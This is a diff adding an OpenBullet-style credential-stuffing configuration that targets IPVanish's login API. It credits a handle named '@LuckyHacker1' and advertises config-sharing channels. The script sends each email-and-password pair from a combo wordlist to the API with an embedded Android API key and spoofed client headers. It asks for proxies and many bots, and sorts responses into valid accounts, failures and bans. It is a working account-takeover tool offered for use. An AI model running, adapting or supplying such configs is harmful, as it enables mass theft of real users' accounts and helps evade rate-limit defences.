@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "IPVanish (Web Api) [ＬＵＣＫＹ]",
+  "SuggestedBots": 140,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-14T15:27:09.0011418+01:00",
+  "AdditionalInfo": "@LootKingGiveaway || @LootKingConfigs",
+  "Author": "@LuckyHacker1",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.ipvanish.com/api/v3/login" 
+  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.6.4.98140b98140\",\"os\":\"25\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"uuid\":\"null\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "X-Client: ipvanish" 
+  HEADER "X-Client-Version: 1.2." 
+  HEADER "X-Platform: Android" 
+  HEADER "X-Platform-Version: 25" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/4.4.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" EqualTo "200" 
+  KEYCHAIN Ban OR 
+    KEY "Too many failed attempts" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
